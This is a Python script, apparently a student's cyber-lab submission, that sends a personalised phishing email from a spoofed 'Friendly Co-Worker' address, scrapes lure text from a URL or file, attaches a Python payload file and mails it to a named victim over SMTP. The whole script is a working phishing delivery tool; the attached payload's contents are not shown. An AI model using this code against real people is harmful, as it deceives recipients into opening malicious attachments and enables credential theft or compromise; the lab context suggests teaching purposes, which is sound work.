#!usr/bin/env python

import smtplib
import os
import argparse
import re

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

LOCAL_SMTP_SERVER = 'localhost'
ATTACHMENT = '/home/daniel/Studies/Yhird_year/Cyber_Lab_Attack/Mail_Phishing/submission/attachment.py'

def parse_arguments():
    parser = argparse.ArgumentParser(prog='Phishing.py',
                                     description='Send Phishing E-mail to Unsuspecting Victim',
                                     usage='python Phishing.py (Name) (Mail-Agent) (Job_Title) [ -s PAYLOAD ] [ -h ] ')

    parser.add_argument('victim_username',
                        help='Mail Username of Victim')

    parser.add_argument('victim_mail',
                        help='Mail Agent of Victim (i.e. Google, Yahoo, etc..)')

    parser.add_argument('victim_job',
                        help="Victim's Job Title")

    parser.add_argument('-s',
                        help='Source Payload to Send (URL / File / String)',
                        required=False,
                        dest='source')

    parser.add_argument('--dbg',
                        help='Debugging flag',
                        required=False,
                        action='store_true',
                        dest='debug')

    return parser.parse_args()


def is_url(query):
    return re.search('^(http:\/\/www\.|https:\/\/www\.|http:\/\/|https:\/\/)?[a-z0-9]+([\-\.]{1}[a-z0-9]+)*\.[a-z]{2,5}(:[0-9]{1,5})?(\/.*)?$', query)


def is_file(query):
    return os.path.exists(query)


def replace_opening(arguments, source_text):
    return re.sub(pattern="(Hello|Hi|Dear)\s+?[a-zA-Z]*?(.)(\s+)[a-zA-Z]*(\s+)?(.|,)?",
                  repl="Hello {} {}.\n".format(arguments.victim_job, arguments.victim_username),
                  string=source_text)


def main():

    arguments = parse_arguments()

    debugging = arguments.debug

    victim_address = '{}@{}'.format(arguments.victim_username, arguments.victim_mail)

    # message creation
    message = MIMEMultipart()
    message['From'] = 'Friendly Co-Worker<co-worker@our-company.org>'
    message['To'] = victim_address
    message['Subject'] = 'Definitely Not Phishing'

    message_text = "Hello {}, {}.\n" \
                   "This is not a phishing attempt but please answer the phone when scammers call, Thank You" \
        .format(arguments.victim_job, arguments.victim_username)

    # if there is a source for the phishing
    source = arguments.source
    if source:
        if is_file(source):
            file = open(source, 'r')
            source_text = ''.join(file.readlines())
            file.close()
            message_text = replace_opening(arguments, source_text)

        elif is_url(source):
            from bs4 import BeautifulSoup
            from requests import get

            response = get(source)
            parser = BeautifulSoup(response.text, 'lxml')

            title = parser.find('title').text
            content = parser.find('body').find('div', class_='content')

            message['Subject'] = title
            message_text = replace_opening(arguments, content)

        else:
            message_text = replace_opening(arguments, source)

    message.attach(MIMEText(message_text, 'plain'))

    filename = os.path.basename(ATTACHMENT)
    attachment = open(filename, "rb")  # for py?
    part = MIMEBase('application', 'octet-stream')
    part.set_payload(attachment.read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', "attchment; filename= {}".format(filename))

    message.attach(part)

    # SENDING PROCESS
    # set up SMTP server
    if debugging:
        # start for debugging
        mail_server = smtplib.SMTP(host=LOCAL_SMTP_SERVER, port=8767)
    else:
        # start for normal mail
        mail_server = smtplib.SMTP(host=LOCAL_SMTP_SERVER)

    mail_server.sendmail('daniel@laptop', victim_address, message.as_string())

    mail_server.quit()





if __name__ == '__main__':
    main()

